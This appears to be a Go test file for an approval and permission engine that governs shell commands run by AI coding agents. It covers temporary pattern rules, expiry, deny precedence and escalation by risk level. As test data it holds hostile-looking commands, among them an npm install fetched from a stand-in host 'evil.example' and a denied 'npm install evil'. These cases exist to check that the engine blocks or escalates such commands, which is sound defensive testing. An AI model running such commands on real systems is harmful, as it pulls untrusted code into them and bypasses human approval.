package chain_test

import (
	"encoding/json"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/lucasndas/mestre/internal/classes"
	"github.com/lucasndas/mestre/internal/hook"
	"github.com/lucasndas/mestre/internal/orchestration/chain"
	"github.com/lucasndas/mestre/internal/orchestration/characters"
	"github.com/lucasndas/mestre/internal/orchestration/tablerules"
	"github.com/lucasndas/mestre/internal/orchestration/tables"
	"github.com/lucasndas/mestre/internal/providers"
)

// The criteria of the temporary table rules
// (docs/orquestracao/regras-temporarias-de-mesa.md) that need the chain, the
// classification and the decision of the engine together; the life of a rule
// (the end of the mission, the revocation) is in the tablerules package.

func newRTM(t *testing.T) *world {
	t.Helper()
	return newWorld(t, worldOpts{realTemp: true})
}

// setTableRules replaces the decrees of kind table_rule of a character, as the
// Citadel does when it builds its effective rules again.
func (f *fakeClasses) setTableRules(id string, ds []classes.Decree) {
	f.mu.Lock()
	defer f.mu.Unlock()
	var keep []classes.Decree
	for _, d := range f.decrees[id] {
		if d.Kind != classes.DecreeTableRule {
			keep = append(keep, d)
		}
	}
	f.decrees[id] = append(keep, ds...)
}

// engineWith is what the engine decides for a command of a character whose
// effective rules carry the decrees of the table rules of (table, class).
func (w *world) engineWith(c characters.Character, command, table, class string) classes.Decision {
	w.t.Helper()
	ds, err := w.orc.TableRules.Decrees(w.ctx, w.slug, table, class)
	if err != nil {
		w.t.Fatal(err)
	}
	w.cls.setTableRules(c.ID, ds)
	w.cls.mu.Lock()
	w.cls.now = w.clk.Now()
	w.cls.mu.Unlock()
	ev := w.hookRequest(c, command).Event
	ev.ReceivedAt = w.clk.Now()
	env, _ := w.cls.Env(w.ctx, c.ID)
	rules, _ := w.cls.Rules(w.ctx, c.ID)
	return classes.Decide(w.ctx, env, rules, ev)
}

func (w *world) engine(c characters.Character, command string) classes.Decision {
	return w.engineWith(c, command, c.Table, c.Class)
}

// approvePattern is the Mestre da mesa approving the pattern of a request.
func (w *world) approvePattern(request int64, pattern string, d time.Duration) chain.Outcome {
	w.t.Helper()
	out, err := w.ch.Decide(w.ctx, chain.Decision{Request: request, By: w.master.ID, Answer: chain.AnswerApprovePattern, Pattern: pattern, For: d, Reason: "padrão"})
	if err != nil {
		w.t.Fatalf("approve pattern %q: %v", pattern, err)
	}
	if out.Applied != "temporary_rule" {
		w.t.Fatalf("applied = %q, want a temporary rule", out.Applied)
	}
	return out
}

func (w *world) rules() []tablerules.Rule {
	w.t.Helper()
	rs, err := w.orc.TableRules.List(w.ctx, w.slug, w.table.ID)
	if err != nil {
		w.t.Fatal(err)
	}
	return rs
}

func (w *world) uses(id int64) int {
	w.t.Helper()
	us, err := w.orc.TableRules.Uses(w.ctx, id)
	if err != nil {
		w.t.Fatal(err)
	}
	return len(us)
}

// otherTable opens the table of the epic 43 with a developer in it.
func (w *world) otherTable() (tables.Table, characters.Character, characters.Character) {
	w.t.Helper()
	opened, err := w.orc.Tables.Open(w.ctx, tables.OpenRequest{By: w.gm, Epic: 43})
	if err != nil {
		w.t.Fatal(err)
	}
	w.machines.Report(w.ctx, opened.Master.ID, characters.Idle)
	res, err := w.orc.Characters.Create(w.ctx, characters.CreateRequest{Name: "Dev3", Sheet: w.nextSheet(), Workspace: w.slug, Table: opened.Table.ID, Role: characters.RoleCharacter,
		Creator: characters.Creator{Kind: characters.CreatedByCharacter, ID: opened.Master.ID}})
	if err != nil {
		w.t.Fatal(err)
	}
	return opened.Table, opened.Master, res.Character
}

// CA-RTM-01
func TestAPatternApprovedByTheTableMasterFreesTheOtherDevsOfTheTableUntilItExpires(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")
	id := w.shell(dev1, "npm install x")
	w.approvePattern(id, "npm install *", 2*time.Hour)

	d := w.engine(dev2, "npm install y")
	if d.Verdict != classes.Allow || d.Layer != classes.LayerDecree || d.Decree == 0 {
		t.Fatalf("npm install y by another dev of the table = %+v, want allowed by the rule", d)
	}
	// a dev of another table still asks, even when the rules it carries are the first table's
	_, _, dev3 := w.otherTable()
	if d := w.engine(dev3, "npm install y"); d.Verdict != classes.Ask {
		t.Errorf("npm install y in another table = %+v, want ask", d)
	}
	if d := w.engineWith(dev3, "npm install y", w.table.ID, dev1.Class); d.Verdict != classes.Ask {
		t.Errorf("npm install y in another table with the decree of this one = %+v, want ask: the gate checks the table at the use", d)
	}
	w.clk.Advance(2 * time.Hour)
	if d := w.engine(dev2, "npm install y"); d.Verdict != classes.Ask {
		t.Errorf("npm install y 2 h later = %+v, want ask", d)
	}
}

// CA-RTM-02
func TestATemporaryRuleNeverBeatsADenyOfTheClassNorADecreeOfAPerson(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")
	w.cls.yaml[dev2.ID] = strings.Replace(devYAML, "commands:\n", "commands:\n  deny: [\"npm install evil\"]\n", 1)
	w.approvePattern(w.shell(dev1, "npm install x"), "npm install *", time.Hour)

	if d := w.engine(dev2, "npm install fine"); d.Verdict != classes.Allow {
		t.Fatalf("npm install fine = %+v, want the rule to free it", d)
	}
	if d := w.engine(dev2, "npm install evil"); d.Verdict != classes.Deny {
		t.Errorf("npm install evil = %+v, want denied by the class", d)
	}
	// a decree of an Approver that forbids the pattern in the table wins over the rule
	w.cls.mu.Lock()
	w.cls.decrees[dev2.ID] = append(w.cls.decrees[dev2.ID], classes.Decree{ID: 900, Level: classes.LevelApprover,
		Effect: classes.Effect{Kind: classes.EffectPermission, Deny: &classes.Grant{Commands: []string{"npm install *"}}}})
	w.cls.mu.Unlock()
	d := w.engine(dev2, "npm install fine")
	if d.Verdict != classes.Deny || d.Decree != 900 {
		t.Errorf("npm install fine with a decree that forbids it = %+v, want denied by the decree 900", d)
	}
	if n := w.uses(w.rules()[0].ID); n != 1 {
		t.Errorf("the rule let %d actions through, want only the first", n)
	}
}

// CA-RTM-03
func TestTheTableMasterCannotMakeARuleLongerThanTheMaximumInAnotherTableOrAboveItsGroups(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1 := w.recruit("Dev1")
	id := w.shell(dev1, "npm install x")
	if ref := w.refusal(chain.Decision{Request: id, By: w.master.ID, Answer: chain.AnswerApprovePattern, Pattern: "npm install *", For: 48 * time.Hour, Reason: "muito"}); ref.Code != chain.CodeDurationTooLong {
		t.Errorf("48 h = %+v, want duration_too_long", ref)
	}
	if ref := w.refusal(chain.Decision{Request: id, By: w.master.ID, Answer: chain.AnswerApproveFor, For: 48 * time.Hour, Reason: "muito"}); ref.Code != chain.CodeDurationTooLong {
		t.Errorf("approve_for 48 h = %+v, want duration_too_long", ref)
	}
	// a request of another table is not at the level of this master
	_, _, dev3 := w.otherTable()
	other := w.shell(dev3, "npm install x")
	if ref := w.refusal(chain.Decision{Request: other, By: w.master.ID, Answer: chain.AnswerApprovePattern, Pattern: "npm install *", For: time.Hour, Reason: "outra mesa"}); ref.Code != chain.CodeNotAtLevel {
		t.Errorf("a rule for another table = %+v, want not_at_level", ref)
	}
	// pip * reaches instalacao_e_sistema, which the default list does not give to the table master;
	// npm install -g x is not even at its level
	pip := w.shell(dev1, "pip install x")
	if w.level(pip) != chain.LevelMesa {
		t.Fatalf("pip install x is at %s", w.level(pip))
	}
	if ref := w.refusal(chain.Decision{Request: pip, By: w.master.ID, Answer: chain.AnswerApprovePattern, Pattern: "pip *", For: time.Hour, Reason: "tudo do pip"}); ref.Code != chain.CodeAboveCeiling {
		t.Errorf("pip * = %+v, want above_ceiling", ref)
	}
	global := w.shell(dev1, "npm install -g x")
	if w.level(global) != chain.LevelGrandMaster {
		t.Errorf("npm install -g x is at %s, want the Grand Master", w.level(global))
	}
	if ref := w.refusal(chain.Decision{Request: global, By: w.master.ID, Answer: chain.AnswerApprovePattern, Pattern: "npm install -g *", For: time.Hour, Reason: "global"}); ref.Code != chain.CodeNotAtLevel {
		t.Errorf("npm install -g * = %+v, want not_at_level", ref)
	}
	for _, r := range []int64{id, pip} {
		if w.level(r) != chain.LevelMesa || w.request(r).State != chain.Open {
			t.Errorf("request #%d moved to %+v", r, w.request(r).Level)
		}
	}
	if n := len(w.rules()); n != 0 {
		t.Errorf("%d rules were made", n)
	}
}

// Part of CA-RTM-05 (the document built by the production builder is in internal/app)
func TestTheEffectiveRulesCarryTheRuleAsATableRuleDecreeAndTheDegradedSnapshotDoesNotUseIt(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")
	w.approvePattern(w.shell(dev1, "npm install x"), "npm install *", 2*time.Hour)
	ds, err := w.orc.TableRules.Decrees(w.ctx, w.slug, dev2.Table, dev2.Class)
	if err != nil || len(ds) != 1 {
		t.Fatalf("decrees = %+v, %v", ds, err)
	}
	w.cls.setTableRules(dev2.ID, ds)
	w.cls.mu.Lock()
	w.cls.now = w.clk.Now()
	w.cls.mu.Unlock()
	rules, _ := w.cls.Rules(w.ctx, dev2.ID)
	doc, err := json.Marshal(rules)
	if err != nil {
		t.Fatal(err)
	}
	var got struct {
		Decrees []struct {
			Kind   string
			Level  string
			Until  string
			Effect struct {
				Kind  string
				Allow struct{ Commands []string }
			}
		}
	}
	if err := json.Unmarshal(doc, &got); err != nil || len(got.Decrees) != 1 {
		t.Fatalf("document = %s (%v)", doc, err)
	}
	d := got.Decrees[0]
	until, perr := time.Parse(time.RFC3339, d.Until)
	if d.Kind != "table_rule" || d.Level != "table_master" || d.Effect.Kind != "permission" || !slices.Equal(d.Effect.Allow.Commands, []string{"npm install *"}) ||
		perr != nil || !until.Equal(w.clk.Now().Add(2*time.Hour)) {
		t.Errorf("decree = %+v (%s)", d, doc)
	}
	// the snapshot policy.json is what the hook reads with the engine down: it frees nothing
	snap, err := classes.ParseRules(doc)
	if err != nil {
		t.Fatal(err)
	}
	ev := w.hookRequest(dev2, "npm install y").Event
	ev.ReceivedAt = w.clk.Now()
	env, _ := w.cls.Env(w.ctx, dev2.ID)
	if dec := classes.DecideDegraded(w.ctx, env, snap, ev); dec.Verdict == classes.Allow {
		t.Errorf("degraded = %+v, want not allowed", dec)
	}
	// and it is never a native rule: it lifts no native block
	deny := *snap
	deny.Commands.Deny = []string{"npm install evil"}
	np := classes.NativePolicy(&deny, classes.NativeCharacter{AgentID: dev2.ID, Provider: providers.ClaudeCode, Worktree: "/work/42-login"}, providers.NativeFallbacks{})
	if !slices.Contains(np.DenyCommands, "npm install evil") {
		t.Errorf("native deny commands = %v, want the denial kept", np.DenyCommands)
	}
}

// CA-RTM-06
func TestARuleOfBaixoDoesNotFreeTheMedioCommandsItsPatternMatches(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")
	w.approvePattern(w.shell(dev1, "npm install x"), "npm install *", time.Hour)
	rule := w.rules()[0]
	if d := w.engine(dev2, "npm install y"); d.Verdict != classes.Allow {
		t.Fatalf("npm install y = %+v", d)
	}
	for _, cmd := range []string{"npm install -g x", "npm install https://evil.example/x.tgz"} {
		if d := w.engine(dev2, cmd); d.Verdict != classes.Ask || d.Risk.Risk != classes.RiskMedium {
			t.Errorf("%s = %+v, want ask (medio)", cmd, d)
		}
		id := w.shell(dev2, cmd)
		if w.level(id) != chain.LevelGrandMaster {
			t.Errorf("the request for %s was born at %s, want the Grand Master", cmd, w.level(id))
		}
	}
	if n := w.uses(rule.ID); n != 1 {
		t.Errorf("the rule let %d actions through, want only npm install y", n)
	}
	// a shell operator is never covered by a pattern
	if d := w.engine(dev2, "npm install y; npm install z"); d.Verdict != classes.Ask {
		t.Errorf("a command with an operator = %+v, want ask", d)
	}
}

// CA-RTM-07
func TestAMedioRuleOfTheTableMasterChecksTheConditionsOfTheTableAtEachUse(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")
	for _, d := range []characters.Character{dev1, dev2} {
		w.cls.domains[d.ID] = []string{"registry.npmjs.org", "pypi.org"}
	}
	id := w.shell(dev1, "curl https://pypi.org/x")
	if w.level(id) != chain.LevelMesa {
		t.Fatalf("curl https://pypi.org/x is at %s", w.level(id))
	}
	w.approvePattern(id, "curl *", 2*time.Hour)
	rule := w.rules()[0]
	if rule.Risk != classes.RiskMedium {
		t.Fatalf("rule = %+v, want medio", rule)
	}
	if d := w.engine(dev2, "curl https://pypi.org/x"); d.Verdict != classes.Allow || d.Decree != rule.ID {
		t.Fatalf("curl pypi.org = %+v, want the rule", d)
	}
	if n := w.uses(rule.ID); n != 1 {
		t.Errorf("uses = %d, want the execution registered", n)
	}
	for _, cmd := range []string{"curl https://exemplo.io", "curl -o ../fora/x https://pypi.org/x"} {
		if d := w.engine(dev2, cmd); d.Verdict == classes.Allow {
			t.Errorf("%s = %+v, want it not freed: a condition of the table fails", cmd, d)
		}
		if lvl := w.level(w.shell(dev2, cmd)); lvl != chain.LevelGrandMaster {
			t.Errorf("the request for %s was born at %s, want the Grand Master", cmd, lvl)
		}
	}
	if n := w.uses(rule.ID); n != 1 {
		t.Errorf("uses = %d after the refused ones, want 1", n)
	}
	// the Owner takes rede off the list: the first one asks again; it holds again when the group comes back
	s := chain.DefaultSettings()
	full := s.MesaDecides
	s.MesaDecides = slices.DeleteFunc(slices.Clone(full), func(g string) bool { return g == classes.GroupNetwork })
	w.policy.set(s)
	if d := w.engine(dev2, "curl https://pypi.org/x"); d.Verdict != classes.Ask {
		t.Errorf("curl pypi.org without rede in the list = %+v, want ask", d)
	}
	s.MesaDecides = full
	w.policy.set(s)
	if d := w.engine(dev2, "curl https://pypi.org/x"); d.Verdict != classes.Allow {
		t.Errorf("curl pypi.org with rede back = %+v, want the rule", d)
	}
}

// CA-RTM-08
func TestTheAutonomyPauseSuspendsAMedioRuleAndAPatternAboveTheCeilingIsRefused(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")
	id := w.shell(dev1, "docker compose up -d")
	if ref := w.refusal(chain.Decision{Request: id, By: w.master.ID, Answer: chain.AnswerApprovePattern, Pattern: "docker *", For: time.Hour, Reason: "tudo"}); ref.Code != chain.CodeAboveCeiling {
		t.Errorf("docker * = %+v, want above_ceiling (alto)", ref)
	}
	w.approvePattern(id, "docker compose up *", time.Hour)

	w.sup.mu.Lock()
	w.sup.paused = true
	w.sup.mu.Unlock()
	if d := w.engine(dev2, "docker compose up -d"); d.Verdict != classes.Ask {
		t.Fatalf("under the pause = %+v, want ask", d)
	}
	if lvl := w.level(w.shell(dev2, "docker compose up -d")); lvl != chain.LevelGrandMaster {
		t.Errorf("under the pause the request was born at %s, want the Grand Master", lvl)
	}
	w.sup.mu.Lock()
	w.sup.paused = false
	w.sup.mu.Unlock()
	if d := w.engine(dev2, "docker compose up -d"); d.Verdict != classes.Allow {
		t.Errorf("after the pause = %+v, want the rule", d)
	}
}

// Part of CA-CADEIA-09: the approval for a time of the exact action is a rule
// of baixo or medio inside the maximum, and the Grand Master, who decides the
// medio of any group, makes the rule of the pattern its request needs.
func TestApprovingForATimeMakesARuleOfTheExactActionAndTheGrandMasterMakesTheMedioOnes(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")
	id := w.shell(dev1, "npm install lodash")
	out, err := w.ch.Decide(w.ctx, chain.Decision{Request: id, By: w.master.ID, Answer: chain.AnswerApproveFor, For: time.Hour, Reason: "por uma hora"})
	if err != nil || out.Applied != "temporary_rule" {
		t.Fatalf("approve for = %+v, %v", out, err)
	}
	if d := w.engine(dev2, "npm install lodash"); d.Verdict != classes.Allow {
		t.Errorf("the same action by another dev = %+v, want the rule", d)
	}
	if d := w.engine(dev2, "npm install other"); d.Verdict != classes.Ask {
		t.Errorf("another action = %+v, want ask: the rule is of the exact action", d)
	}
	if ref := w.refusal(chain.Decision{Request: w.shell(dev1, "npm install z"), By: w.master.ID, Answer: chain.AnswerApproveFor, Reason: "sem tempo"}); ref.Code != chain.CodeBadAnswer {
		t.Errorf("approve for without a time = %+v, want bad_answer", ref)
	}
	// the Grand Master's rule of a medio of any group
	g := w.shell(dev1, "npm install -g x")
	if _, err := w.ch.Decide(w.ctx, chain.Decision{Request: g, By: w.gm.ID, Answer: chain.AnswerApprovePattern, Pattern: "npm install -g *", For: time.Hour, Reason: "global"}); err != nil {
		t.Fatalf("the Grand Master's pattern: %v", err)
	}
	if rs := w.rules(); len(rs) != 2 || rs[1].Level != chain.LevelGrandMaster || rs[1].Risk != classes.RiskMedium {
		t.Errorf("rules = %+v", rs)
	}
}

// CA-RTM-09
func TestApprovingForATimeIsRefusedForARequestTheEngineDoesNotAnalyseWholeAndForAChainedCommand(t *testing.T) {
	t.Parallel()
	w := newRTM(t)
	dev1, dev2 := w.recruit("Dev1"), w.recruit("Dev2")

	// a part with no group is the Grand Master's; a chained command whose last part
	// runs a script of the worktree is a medio the table master decides
	opaque, chained, tool := w.shell(dev1, "alias ll=ls"), w.shell(dev1, "make build && ./run.sh"), w.mcp(dev1, "mcp__db__query")
	if r := w.request(opaque); r.Level.Kind != chain.LevelGrandMaster || !slices.Contains(r.Risk.Groups, classes.GroupNone) {
		t.Fatalf("alias ll=ls is %s at %+v with groups %v, want a medio with no group at the Grand Master", r.Risk.Risk, r.Level, r.Risk.Groups)
	}
	if r := w.request(chained); r.Level.Kind != chain.LevelMesa || r.Risk.Risk != classes.RiskMedium {
		t.Fatalf("the chained command is %s at %+v, want a medio at the table master", r.Risk.Risk, r.Level)
	}
	if r := w.request(tool); r.Level.Kind != chain.LevelGrandMaster || !slices.Contains(r.Risk.Groups, classes.GroupNone) {
		t.Fatalf("a tool with no row in the table is %s at %+v with groups %v, want a medio with no group at the Grand Master", r.Risk.Risk, r.Level, r.Risk.Groups)
	}
	for _, c := range []struct {
		id int64
		by characters.Character
	}{{opaque, w.gm}, {chained, w.master}, {tool, w.gm}} {
		for _, d := range []chain.Decision{
			{Answer: chain.AnswerApproveFor, For: time.Hour},
			{Answer: chain.AnswerApproveFor, UntilMissionEnd: true},
		} {
			d.Request, d.By, d.Reason = c.id, c.by.ID, "por um tempo"
			ref := w.refusal(d)
			if ref.Code != chain.CodeBadAnswer || ref.Climbed || !strings.Contains(ref.Message, "approve it now") {
				// the message tells the blocker from the other bad_answer ("the request has no mission to end with")
				t.Errorf("#%d for a time %+v = %+v, want bad_answer from the blocker and the request kept at its level", c.id, d, ref)
			}
			if r := w.request(c.id); r.State != chain.Open || r.Level.Agent != c.by.ID {
				t.Errorf("#%d moved to %s at %+v", c.id, r.State, r.Level)
			}
		}
	}
	if n := len(w.rules()); n != 0 {
		t.Errorf("%d rules were made", n)
	}
	// the one-time exception is the way, and it frees nothing for the others
	if out := w.decide(w.master, chained, chain.AnswerApprove, "só desta vez"); out.Applied != "exception" {
		t.Errorf("approve now = %+v, want an exception", out)
	}
	if d := w.engine(dev2, "make build && ./run.sh"); d.Verdict != classes.Ask {
		t.Errorf("the same chain by another dev = %+v, want ask", d)
	}
}

// mcp is an ask of a character for a call of an MCP tool, the kind the table has
// no row for.
func (w *world) mcp(c characters.Character, name string) int64 {
	w.t.Helper()
	tool := &providers.Tool{NativeName: name, Kind: providers.KindMCP}
	ev := providers.Event{Version: providers.EventVersion, Event: providers.EventPreTool, AgentID: c.ID, TableID: c.Table, Cwd: "/work/42-login", Tool: tool}
	env, _ := w.cls.Env(w.ctx, c.ID)
	rules, _ := w.cls.Rules(w.ctx, c.ID)
	risk := classes.ClassifyRisk(env, rules, classes.RiskRequest{Tool: tool, Cwd: ev.Cwd})
	id, err := w.ch.Open(w.ctx, hook.ApprovalRequest{AgentID: c.ID, TableID: c.Table, Action: classes.Action{Kind: tool.Kind, Tool: name}, About: name, Risk: risk, Event: ev})
	if err != nil {
		w.t.Fatalf("open %q: %v", name, err)
	}
	return id
}
